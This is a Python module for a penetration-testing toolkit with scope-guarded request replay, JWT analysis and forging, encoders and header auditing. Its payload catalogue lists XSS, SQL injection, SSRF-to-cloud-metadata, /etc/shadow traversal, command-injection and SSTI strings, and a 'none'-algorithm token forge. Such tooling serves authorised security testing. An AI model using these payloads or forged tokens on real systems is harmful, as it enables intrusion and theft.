"""OWASP PTK (Penetration Testing Kit) integration engine.

Inspired by Denis Podgurskii's OWASP PTK (https://github.com/DenisPodgurskii/pentestkit).
Provides:
1. R-Builder: Interactive HTTP Request Builder & Replayer with cURL import/export and Scope Guard enforcement.
2. JWT Security Lab: Token decoder, claim viewer, expiration validator, weak secret detector, and 'none' alg forge.
3. Pentest Payloads & Data Transformation: Multi-format encoder/decoder (URL, Base64, Hex, HTML, Hashes) and curated attack payloads.
4. Client-Side Security & SCA: Security headers analysis, cookie auditing, and JS library component identification.
"""

from __future__ import annotations

import base64
import hashlib
import html
import hmac
import json
import re
import shlex
import time
import urllib.parse
from dataclasses import dataclass
from typing import Any, Dict, List, Optional, Tuple

import requests

from core.scope import ScopeAuthorizationService
from storage.db import Database
from storage.models import Project


# -------------------------------------------------------------------------
# 1. PTK Data Transformation & Encoders
# -------------------------------------------------------------------------

class PTKEncoder:
    """Multi-format data encoding, decoding, and cryptographic hashing utilities."""

    @staticmethod
    def url_encode(text: str, plus: bool = False) -> str:
        return urllib.parse.quote_plus(text) if plus else urllib.parse.quote(text)

    @staticmethod
    def url_decode(text: str) -> str:
        return urllib.parse.unquote(text)

    @staticmethod
    def base64_encode(text: str) -> str:
        return base64.b64encode(text.encode("utf-8")).decode("utf-8")

    @staticmethod
    def base64_decode(text: str) -> str:
        padded = text.strip()
        pad = len(padded) % 4
        if pad:
            padded += "=" * (4 - pad)
        return base64.b64decode(padded).decode("utf-8", errors="replace")

    @staticmethod
    def hex_encode(text: str, delimiter: str = "") -> str:
        encoded = text.encode("utf-8").hex()
        if delimiter:
            return delimiter.join(encoded[i : i + 2] for i in range(0, len(encoded), 2))
        return encoded

    @staticmethod
    def hex_decode(text: str) -> str:
        clean = text.replace(" ", "").replace("0x", "").replace("\\x", "").replace(":", "")
        try:
            return bytes.fromhex(clean).decode("utf-8", errors="replace")
        except ValueError as exc:
            return f"[Error: Invalid hex string - {exc}]"

    @staticmethod
    def html_encode(text: str) -> str:
        return html.escape(text)

    @staticmethod
    def html_decode(text: str) -> str:
        return html.unescape(text)

    @staticmethod
    def hash_md5(text: str) -> str:
        return hashlib.md5(text.encode("utf-8")).hexdigest()

    @staticmethod
    def hash_sha1(text: str) -> str:
        return hashlib.sha1(text.encode("utf-8")).hexdigest()

    @staticmethod
    def hash_sha256(text: str) -> str:
        return hashlib.sha256(text.encode("utf-8")).hexdigest()


# -------------------------------------------------------------------------
# 2. PTK JWT Security Lab
# -------------------------------------------------------------------------

@dataclass
class JWTAnalysisResult:
    is_valid_format: bool
    header: Dict[str, Any]
    payload: Dict[str, Any]
    signature_raw: str
    algorithm: str
    is_expired: bool
    expiration_date: Optional[str]
    issued_at_date: Optional[str]
    vulnerabilities: List[Dict[str, str]]
    error: Optional[str] = None


class PTKJWTAnalyzer:
    """OWASP PTK JSON Web Token (JWT) analyzer, claim validator, and security auditing engine."""

    COMMON_WEAK_SECRETS = [
        "secret",
        "password",
        "123456",
        "admin",
        "jwt",
        "jwt_secret",
        "key",
        "supersecret",
        "app_secret",
        "development",
    ]

    @staticmethod
    def _b64url_decode(segment: str) -> bytes:
        padded = segment.strip().replace("-", "+").replace("_", "/")
        pad = len(padded) % 4
        if pad:
            padded += "=" * (4 - pad)
        return base64.b64decode(padded)

    @staticmethod
    def _b64url_encode(data: bytes) -> str:
        return base64.urlsafe_b64encode(data).decode("utf-8").rstrip("=")

    @classmethod
    def analyze_token(cls, token: str) -> JWTAnalysisResult:
        """Parses and audits a JWT for vulnerabilities and security posture."""
        parts = token.strip().split(".")
        if len(parts) != 3:
            return JWTAnalysisResult(
                is_valid_format=False,
                header={},
                payload={},
                signature_raw="",
                algorithm="Unknown",
                is_expired=False,
                expiration_date=None,
                issued_at_date=None,
                vulnerabilities=[],
                error=f"Malformed JWT: Expected 3 dot-separated segments, got {len(parts)}.",
            )

        try:
            header_json = cls._b64url_decode(parts[0]).decode("utf-8", errors="replace")
            header = json.loads(header_json)
        except Exception as exc:
            return JWTAnalysisResult(
                is_valid_format=False,
                header={},
                payload={},
                signature_raw=parts[2],
                algorithm="Unknown",
                is_expired=False,
                expiration_date=None,
                issued_at_date=None,
                vulnerabilities=[],
                error=f"Failed to parse JWT Header JSON: {exc}",
            )

        try:
            payload_json = cls._b64url_decode(parts[1]).decode("utf-8", errors="replace")
            payload = json.loads(payload_json)
        except Exception as exc:
            return JWTAnalysisResult(
                is_valid_format=False,
                header=header,
                payload={},
                signature_raw=parts[2],
                algorithm=str(header.get("alg", "None")),
                is_expired=False,
                expiration_date=None,
                issued_at_date=None,
                vulnerabilities=[],
                error=f"Failed to parse JWT Payload JSON: {exc}",
            )

        alg = str(header.get("alg", "none"))
        now = time.time()
        is_expired = False
        exp_date = None
        iat_date = None
        vulns: List[Dict[str, str]] = []

        # Expiration checks
        if "exp" in payload and isinstance(payload["exp"], (int, float)):
            exp_ts = payload["exp"]
            exp_date = time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime(exp_ts))
            if exp_ts < now:
                is_expired = True
                vulns.append({
                    "severity": "Medium",
                    "title": "Expired Token",
                    "desc": f"Token expired at {exp_date} (Current time: {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime(now))}).",
                })
        else:
            vulns.append({
                "severity": "Low",
                "title": "Missing Expiration Claim (exp)",
                "desc": "Token does not contain an 'exp' claim and may be valid indefinitely.",
            })

        if "iat" in payload and isinstance(payload["iat"], (int, float)):
            iat_date = time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime(payload["iat"]))

        # Algorithm checks
        if alg.lower() == "none":
            vulns.append({
                "severity": "Critical",
                "title": "Insecure 'none' Algorithm Supported",
                "desc": "The JWT specifies 'alg: none' allowing complete signature bypass and arbitrary claim tampering.",
            })

        if not parts[2]:
            vulns.append({
                "severity": "Critical",
                "title": "Missing Signature",
                "desc": "The JWT lacks a cryptographic signature entirely.",
            })

        # Weak secret brute force check (HS256)
        if alg.upper() == "HS256" and parts[2]:
            signing_input = f"{parts[0]}.{parts[1]}".encode("utf-8")
            for candidate in cls.COMMON_WEAK_SECRETS:
                computed_sig = hmac.new(
                    candidate.encode("utf-8"), signing_input, hashlib.sha256
                ).digest()
                computed_b64 = cls._b64url_encode(computed_sig)
                if computed_b64 == parts[2]:
                    vulns.append({
                        "severity": "Critical",
                        "title": f"Weak HMAC Secret Detected ('{candidate}')",
                        "desc": f"The JWT signature was verified using common weak passphrase '{candidate}'. Attackers can forge arbitrary valid tokens.",
                    })
                    break

        # Sensitive data exposure check
        for sensitive_key in ("password", "passwd", "secret", "private_key", "ssn", "credit_card"):
            if sensitive_key in payload:
                vulns.append({
                    "severity": "High",
                    "title": f"Sensitive Credential in Plaintext Payload ({sensitive_key})",
                    "desc": f"JWT payloads are only Base64-encoded, not encrypted. Found sensitive field '{sensitive_key}'.",
                })

        return JWTAnalysisResult(
            is_valid_format=True,
            header=header,
            payload=payload,
            signature_raw=parts[2],
            algorithm=alg,
            is_expired=is_expired,
            expiration_date=exp_date,
            issued_at_date=iat_date,
            vulnerabilities=vulns,
        )

    @classmethod
    def forge_none_token(cls, original_token: str, payload_override: Optional[Dict[str, Any]] = None) -> str:
        """Forges an 'alg: none' token by stripping signature and modifying payload."""
        res = cls.analyze_token(original_token)
        header = dict(res.header) if res.is_valid_format else {"typ": "JWT"}
        header["alg"] = "none"

        payload = dict(res.payload) if res.is_valid_format else {}
        if payload_override:
            payload.update(payload_override)

        header_b64 = cls._b64url_encode(json.dumps(header, separators=(",", ":")).encode("utf-8"))
        payload_b64 = cls._b64url_encode(json.dumps(payload, separators=(",", ":")).encode("utf-8"))
        return f"{header_b64}.{payload_b64}."

    @classmethod
    def forge_hmac_token(
        cls,
        header: Dict[str, Any],
        payload: Dict[str, Any],
        secret: str,
        algorithm: str = "HS256",
    ) -> str:
        """Crafts a signed JWT with a given secret."""
        header["alg"] = algorithm
        header_b64 = cls._b64url_encode(json.dumps(header, separators=(",", ":")).encode("utf-8"))
        payload_b64 = cls._b64url_encode(json.dumps(payload, separators=(",", ":")).encode("utf-8"))
        signing_input = f"{header_b64}.{payload_b64}".encode("utf-8")

        if algorithm == "HS256":
            sig = hmac.new(secret.encode("utf-8"), signing_input, hashlib.sha256).digest()
        elif algorithm == "HS384":
            sig = hmac.new(secret.encode("utf-8"), signing_input, hashlib.sha384).digest()
        elif algorithm == "HS512":
            sig = hmac.new(secret.encode("utf-8"), signing_input, hashlib.sha512).digest()
        else:
            raise ValueError(f"Unsupported HMAC algorithm: {algorithm}")

        sig_b64 = cls._b64url_encode(sig)
        return f"{header_b64}.{payload_b64}.{sig_b64}"


# -------------------------------------------------------------------------
# 3. PTK Pentest Payload Catalog
# -------------------------------------------------------------------------

class PTKPayloads:
    """Categorized collection of penetration testing payloads inspired by OWASP PTK."""

    PAYLOADS: Dict[str, List[Dict[str, str]]] = {
        "Cross-Site Scripting (XSS)": [
            {"title": "Basic Script Tag", "payload": "<script>alert(1)</script>"},
            {"title": "IMG OnError Event", "payload": '<img src=x onerror=alert(document.domain)>'},
            {"title": "SVG OnLoad Event", "payload": '<svg/onload=alert(1)>'},
            {"title": "JavaScript URI", "payload": 'javascript:alert(1)'},
            {"title": "DOM XSS Polyglot", "payload": 'jaVasCript:/*-/*`/*\\\'/*"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sCripT src=//14.rs>'},
            {"title": "Filter Bypass (Upper Case)", "payload": '<sCrIpt>alert(1)</sCrIpt>'},
        ],
        "SQL Injection (SQLi)": [
            {"title": "Classic Auth Bypass", "payload": "' OR 1=1 --"},
            {"title": "Double Quote Auth Bypass", "payload": '" OR ""="" --'},
            {"title": "Numeric True Condition", "payload": "1 OR 1=1"},
            {"title": "Generic UNION Injection", "payload": "' UNION SELECT null, username, password FROM users --"},
            {"title": "MySQL Time-Based Blind", "payload": "' OR SLEEP(5) --"},
            {"title": "PostgreSQL Time-Based", "payload": "'; pg_sleep(5); --"},
            {"title": "MSSQL WAITFOR DELAY", "payload": "'; WAITFOR DELAY '0:0:5' --"},
        ],
        "Server-Side Request Forgery (SSRF)": [
            {"title": "AWS Metadata (IPv4)", "payload": "http://169.254.169.254/latest/meta-data/"},
            {"title": "AWS Metadata v2 (IMDSv2 Token)", "payload": "http://169.254.169.254/latest/api/token"},
            {"title": "GCP Metadata", "payload": "http://metadata.google.internal/computeMetadata/v1/"},
            {"title": "Localhost IPv4", "payload": "http://127.0.0.1:8080"},
            {"title": "Localhost IPv6", "payload": "http://[::1]:80"},
            {"title": "Decimal IP (127.0.0.1)", "payload": "http://2130706433/"},
        ],
        "Path Traversal / Local File Inclusion (LFI)": [
            {"title": "Linux /etc/passwd (4 levels)", "payload": "../../../../etc/passwd"},
            {"title": "Linux /etc/shadow (Root)", "payload": "../../../../etc/shadow"},
            {"title": "Windows win.ini", "payload": "..\\..\\..\\..\\windows\\win.ini"},
            {"title": "URL Encoded Traversal", "payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"},
            {"title": "Double URL Encoded", "payload": "%252e%252e%252f%252e%252e%252fetc%252fpasswd"},
            {"title": "Null Byte Terminated (Legacy PHP)", "payload": "../../../../etc/passwd%00"},
        ],
        "Command Injection": [
            {"title": "Semicolon Separator", "payload": "; id; whoami"},
            {"title": "Pipe Separator", "payload": "| id"},
            {"title": "Subshell Execution", "payload": "$(id)"},
            {"title": "Backtick Execution", "payload": "`id`"},
            {"title": "AND Operator", "payload": "&& whoami"},
            {"title": "Windows Type Hosts", "payload": "& type C:\\Windows\\System32\\drivers\\etc\\hosts"},
        ],
        "Server-Side Template Injection (SSTI)": [
            {"title": "Jinja2 / Twig Probe", "payload": "{{7*7}}"},
            {"title": "Freemarker Probe", "payload": "${7*7}"},
            {"title": "Jinja2 Config Dump", "payload": "{{config.items()}}"},
            {"title": "Jinja2 RCE Subclasses", "payload": "{{''.__class__.__mro__[1].__subclasses__()}}"},
        ],
    }

    @classmethod
    def get_categories(cls) -> List[str]:
        return list(cls.PAYLOADS.keys())

    @classmethod
    def get_payloads(cls, category: str) -> List[Dict[str, str]]:
        return cls.PAYLOADS.get(category, [])


# -------------------------------------------------------------------------
# 4. PTK R-Builder (Request Crafting & cURL Parser)
# -------------------------------------------------------------------------

@dataclass
class PTKResponseResult:
    success: bool
    is_authorized: bool
    scope_reason: str
    status_code: Optional[int]
    status_reason: str
    elapsed_ms: float
    response_headers: Dict[str, str]
    response_body: str
    response_size_bytes: int
    curl_command: str
    error: Optional[str] = None


class PTKRequestBuilder:
    """OWASP PTK R-Builder: HTTP request composer, cURL converter, and replayer with Scope Guard."""

    @staticmethod
    def parse_curl(curl_cmd: str) -> Dict[str, Any]:
        """Parses a cURL command string into method, url, headers, and body."""
        try:
            tokens = shlex.split(curl_cmd.strip())
        except Exception:
            tokens = curl_cmd.strip().split()

        if not tokens:
            return {"method": "GET", "url": "", "headers": {}, "body": ""}

        method = "GET"
        url = ""
        headers: Dict[str, str] = {}
        body = ""

        i = 0
        while i < len(tokens):
            t = tokens[i]
            if t == "curl":
                i += 1
                continue
            elif t in ("-X", "--request") and i + 1 < len(tokens):
                method = tokens[i + 1].upper()
                i += 2
            elif t in ("-H", "--header") and i + 1 < len(tokens):
                header_raw = tokens[i + 1]
                if ":" in header_raw:
                    k, v = header_raw.split(":", 1)
                    headers[k.strip()] = v.strip()
                i += 2
            elif t in ("-d", "--data", "--data-raw", "--data-binary") and i + 1 < len(tokens):
                body = tokens[i + 1]
                if method == "GET":
                    method = "POST"
                i += 2
            elif t in ("-b", "--cookie") and i + 1 < len(tokens):
                headers["Cookie"] = tokens[i + 1]
                i += 2
            elif t in ("-A", "--user-agent") and i + 1 < len(tokens):
                headers["User-Agent"] = tokens[i + 1]
                i += 2
            elif not t.startswith("-") and not url:
                url = t
                i += 1
            else:
                i += 1

        return {
            "method": method,
            "url": url,
            "headers": headers,
            "body": body,
        }

    @staticmethod
    def to_curl(method: str, url: str, headers: Dict[str, str], body: str = "") -> str:
        """Converts an HTTP request definition into a shell-executable cURL command."""
        parts = ["curl", "-i", "-X", shlex.quote(method.upper())]
        for k, v in headers.items():
            parts.extend(["-H", shlex.quote(f"{k}: {v}")])
        if body and method.upper() in ("POST", "PUT", "PATCH", "DELETE"):
            parts.extend(["--data-raw", shlex.quote(body)])
        parts.append(shlex.quote(url))
        return " ".join(parts)

    @classmethod
    def send_request(
        cls,
        method: str,
        url: str,
        headers: Optional[Dict[str, str]] = None,
        body: Optional[str] = None,
        timeout: float = 12.0,
        allow_redirects: bool = True,
        project: Optional[Project] = None,
        db: Optional[Database] = None,
    ) -> PTKResponseResult:
        """Executes an authorized HTTP request under active project Scope Guard."""
        clean_url = url.strip()
        headers = headers or {}
        curl_cmd = cls.to_curl(method, clean_url, headers, body or "")

        # 1. Enforce Target Scope Guard
        if not project or not db:
            return PTKResponseResult(
                success=False,
                is_authorized=False,
                scope_reason="Select an active project with authorized scopes before sending requests.",
                status_code=None,
                status_reason="Blocked by Scope Guard",
                elapsed_ms=0.0,
                response_headers={},
                response_body="",
                response_size_bytes=0,
                curl_command=curl_cmd,
                error="Scope Guard Violation: A project and database are required.",
            )

        if project and db:
            scopes = db.list_scopes(project.id)
            check = ScopeAuthorizationService.is_target_authorized(clean_url, scopes, project=project, resolve_dns=True)
            if not check.is_allowed:
                return PTKResponseResult(
                    success=False,
                    is_authorized=False,
                    scope_reason=check.reason,
                    status_code=None,
                    status_reason="Blocked by Scope Guard",
                    elapsed_ms=0.0,
                    response_headers={},
                    response_body="",
                    response_size_bytes=0,
                    curl_command=curl_cmd,
                    error=f"Scope Guard Violation: {check.reason}",
                )

        # 2. Execute Request with Hop-by-Hop Redirect Scope Guard
        start_t = time.perf_counter()
        try:
            req_headers = dict(headers)
            if "User-Agent" not in req_headers:
                req_headers["User-Agent"] = "CyberSecuritySuite-PTK/1.0"

            current_url = clean_url
            current_method = method.upper()
            current_body = body.encode("utf-8") if body else None
            max_redirects = 5 if allow_redirects else 0
            hops = 0
            resp = None

            while True:
                resp = requests.request(
                    method=current_method,
                    url=current_url,
                    headers=req_headers,
                    data=current_body,
                    timeout=timeout,
                    allow_redirects=False,
                    verify=True,
                )
                if allow_redirects and resp.is_redirect and "Location" in resp.headers and hops < max_redirects:
                    hops += 1
                    loc = resp.headers["Location"].strip()
                    # Validate redirect target against scope before following
                    red_check = ScopeAuthorizationService.validate_web_redirect(
                        initial_url=current_url,
                        redirect_location=loc,
                        scopes=scopes,
                        project=project,
                    )
                    if not red_check.is_allowed:
                        elapsed_ms = round((time.perf_counter() - start_t) * 1000, 2)
                        return PTKResponseResult(
                            success=False,
                            is_authorized=False,
                            scope_reason=red_check.reason,
                            status_code=resp.status_code,
                            status_reason=f"Redirect Blocked ({resp.reason})",
                            elapsed_ms=elapsed_ms,
                            response_headers=dict(resp.headers),
                            response_body=resp.text,
                            response_size_bytes=len(resp.content),
                            curl_command=curl_cmd,
                            error=f"Scope Guard Violation on Redirect: {red_check.reason}",
                        )
                    # Resolve relative redirect URLs using urllib.parse.urljoin
                    current_url = urllib.parse.urljoin(current_url, loc)
                    # Standard HTTP redirect semantics: 303 (See Other) or 301/302 for POST converts to GET
                    if resp.status_code == 303 or (resp.status_code in (301, 302) and current_method == "POST"):
                        current_method = "GET"
                        current_body = None
                else:
                    break

            elapsed_ms = round((time.perf_counter() - start_t) * 1000, 2)
            resp_headers = dict(resp.headers)
            resp_body = resp.text

            return PTKResponseResult(
                success=True,
                is_authorized=True,
                scope_reason="Target authorized within assessment scope",
                status_code=resp.status_code,
                status_reason=resp.reason,
                elapsed_ms=elapsed_ms,
                response_headers=resp_headers,
                response_body=resp_body,
                response_size_bytes=len(resp.content),
                curl_command=curl_cmd,
            )

        except requests.RequestException as exc:
            elapsed_ms = round((time.perf_counter() - start_t) * 1000, 2)
            return PTKResponseResult(
                success=False,
                is_authorized=True,
                scope_reason="Authorized target request failed execution",
                status_code=None,
                status_reason="Network / Connection Error",
                elapsed_ms=elapsed_ms,
                response_headers={},
                response_body="",
                response_size_bytes=0,
                curl_command=curl_cmd,
                error=str(exc),
            )


# -------------------------------------------------------------------------
# 5. PTK Client-Side Security & SCA Analyzer
# -------------------------------------------------------------------------

class PTKSCAAnalyzer:
    """Analyzes response headers, cookie flags, and detects frontend JS libraries (SCA)."""

    RECOMMENDED_HEADERS = {
        "Content-Security-Policy": "Mitigates Cross-Site Scripting (XSS) and data injection attacks.",
        "Strict-Transport-Security": "Enforces HTTPS encryption and protects against SSL stripping.",
        "X-Frame-Options": "Protects users against Clickjacking attacks via iframe embedding.",
        "X-Content-Type-Options": "Prevents MIME-sniffing vulnerabilities by enforcing 'nosniff'.",
        "Referrer-Policy": "Controls how much referrer information is leaked in external requests.",
        "Permissions-Policy": "Restricts browser feature access (camera, microphone, geolocation).",
    }

    KNOWN_JS_COMPONENTS = [
        {"name": "jQuery", "pattern": r"jquery[.-]([0-9.]+)(?:\.min)?\.js", "vuln_versions": ["< 3.5.0"], "cve": "CVE-2020-11022 (XSS in htmlPrefilter)"},
        {"name": "Bootstrap", "pattern": r"bootstrap[.-]([0-9.]+)(?:\.min)?\.js", "vuln_versions": ["< 4.3.1"], "cve": "CVE-2019-8331 (XSS in tooltip/popover)"},
        {"name": "Lodash", "pattern": r"lodash[.-]([0-9.]+)(?:\.min)?\.js", "vuln_versions": ["< 4.17.21"], "cve": "CVE-2021-23337 (Prototype Pollution)"},
        {"name": "AngularJS", "pattern": r"angular[.-]([0-9.]+)(?:\.min)?\.js", "vuln_versions": ["< 1.8.0"], "cve": "End of Life (EOL) Framework with known sandbox escapes"},
        {"name": "React", "pattern": r"react[.-]([0-9.]+)(?:\.production|\.development)?\.js", "vuln_versions": [], "cve": "None"},
        {"name": "Vue.js", "pattern": r"vue[.-]([0-9.]+)(?:\.min)?\.js", "vuln_versions": [], "cve": "None"},
    ]

    @classmethod
    def audit_headers(cls, headers: Dict[str, str]) -> List[Dict[str, str]]:
        """Audits HTTP headers for missing defense controls or info disclosure."""
        findings: List[Dict[str, str]] = []
        lower_headers = {k.lower(): v for k, v in headers.items()}

        for h_name, purpose in cls.RECOMMENDED_HEADERS.items():
            if h_name.lower() not in lower_headers:
                findings.append({
                    "severity": "Medium" if h_name in ("Content-Security-Policy", "X-Frame-Options") else "Low",
                    "title": f"Missing Security Header: {h_name}",
                    "desc": f"The response lacks the '{h_name}' header. {purpose}",
                })

        # Information disclosure headers
        if "server" in lower_headers:
            findings.append({
                "severity": "Low",
                "title": "Server Information Disclosure",
                "desc": f"Server banner disclosed: '{lower_headers['server']}'. Can assist attacker reconnaissance.",
            })
        if "x-powered-by" in lower_headers:
            findings.append({
                "severity": "Low",
                "title": "Technology Disclosure (X-Powered-By)",
                "desc": f"Backend technology disclosed: '{lower_headers['x-powered-by']}'.",
            })

        return findings

    @classmethod
    def detect_components(cls, html_or_js: str) -> List[Dict[str, str]]:
        """Detects third-party JavaScript libraries and known vulnerable versions."""
        detected: List[Dict[str, str]] = []
        for comp in cls.KNOWN_JS_COMPONENTS:
            match = re.search(comp["pattern"], html_or_js, re.IGNORECASE)
            if match:
                ver = match.group(1) if match.groups() else "Detected"
                detected.append({
                    "name": comp["name"],
                    "version": ver,
                    "has_cve": bool(comp["vuln_versions"]),
                    "cve_info": comp["cve"] if comp["vuln_versions"] else "No critical CVEs identified.",
                })
        return detected
